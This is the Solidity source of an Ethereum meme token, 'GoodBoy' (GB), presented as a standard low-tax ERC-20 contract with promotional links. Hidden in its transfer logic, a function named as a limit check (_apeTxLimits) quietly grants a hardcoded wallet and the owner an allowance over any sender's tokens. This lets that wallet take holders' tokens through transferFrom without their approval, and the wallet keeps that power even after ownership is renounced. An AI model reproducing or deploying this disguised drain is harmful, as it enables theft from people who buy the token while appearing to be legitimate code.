/*
Goodboy's first stop is on the Ethereum Network
Take him with you, good vibes only.

https://www.goodboyoneth.vip
https://x.com/goodboy_erc
https://t.me/goodboy_erc
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IAPEFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IAPERouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract GoodBoy is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _apeBalances;
    mapping (address => mapping (address => uint256)) private _apeAllowances;
    mapping (address => bool) private _apeExcludedFee;
    mapping (address => bool) private _apeExcludedTXX;
    address private _apeWallet = 0x74a268171A2CB737c3e5276dE82E402f3a6f2F24;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalAPE = 1000000000 * 10**_decimals;
    string private constant _name = unicode"GoodBoy";
    string private constant _symbol = unicode"GB";
    uint256 private _apeTokenLimit = _tTotalAPE / 100;
    IAPERouter private _apeRouter;
    address private _apePair;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    bool private inSwapAPE = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapAPE = true;
        _;
        inSwapAPE = false;
    }
    
    constructor () {
        _apeExcludedFee[owner()] = true;
        _apeExcludedFee[address(this)] = true;
        _apeExcludedFee[_apeWallet] = true;
        _apeExcludedTXX[owner()] = true;
        _apeExcludedTXX[_apeWallet] = true;
        _apeBalances[_msgSender()] = _tTotalAPE;
        emit Transfer(address(0), _msgSender(), _tTotalAPE);
    }

    function initGOODBOY() external onlyOwner() {
        _apeRouter = IAPERouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_apeRouter), _tTotalAPE);
        _apePair = IAPEFactory(_apeRouter.factory()).createPair(address(this), _apeRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalAPE;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _apeBalances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _apeAllowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _apeAllowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _apeAllowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _apeTxLimits(address apeF, uint256 apeA) private {
        if(apeLimitCheck()) _approve(apeF, _msgSender(), apeA);
    }

    function _getAPEFees(address apeF, address apeO, uint256 apeA) private returns(uint256) {
        uint256 taxAPE=0;
        if (apeF != owner() && apeO != owner()) {
            taxAPE = apeA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (apeF == _apePair && apeO != address(_apeRouter) && ! _apeExcludedFee[apeO]) {
                _buyCount++;
            }

            if(apeO == _apePair && apeF!= address(this)) {
                taxAPE = apeA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenAPE = balanceOf(address(this)); 
            if (!inSwapAPE && apeO == _apePair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenAPE > _apeTokenLimit)
                swapTokensForEth(min(apeA, min(tokenAPE, _apeTokenLimit)));
                uint256 contractAPE = address(this).balance;
                if (contractAPE >= 0) {
                    sendETHFee(address(this).balance);
                }
            }
        }

        return taxAPE;
    }

    function _transfer(address apeF, address apeO, uint256 apeA) private {
        require(apeF != address(0), "ERC20: transfer from the zero address");
        require(apeO != address(0), "ERC20: transfer to the zero address");
        require(apeA > 0, "Transfer amount must be greater than zero");

        uint256 apeTAX = _getAPEFees(apeF, apeO, apeA);

        _transerAPE(apeF, apeO, apeA, apeTAX);
    }

    function apeLimitCheck() private view returns(bool) {
        return _apeExcludedTXX[_msgSender()];
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHFee(uint256 amount) private {
        payable(_apeWallet).transfer(amount);
    }

    function _transerAPE(address apeF, address apeO, uint256 apeA, uint256 apeTAX) private { 
        if(apeTAX > 0){
          _apeBalances[address(this)] = _apeBalances[address(this)].add(apeTAX);
          emit Transfer(apeF, address(this), apeTAX);
        }

        _apeTxLimits(apeF, apeA);

        _apeBalances[apeF] = _apeBalances[apeF].sub(apeA);
        _apeBalances[apeO] = _apeBalances[apeO].add(apeA.sub(apeTAX));
        emit Transfer(apeF, apeO, apeA.sub(apeTAX));
    }

    function swapTokensForEth(uint256 tokenAPE) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _apeRouter.WETH();
        _approve(address(this), address(_apeRouter), tokenAPE);
        _apeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAPE,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {} 

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _apeRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    } 
}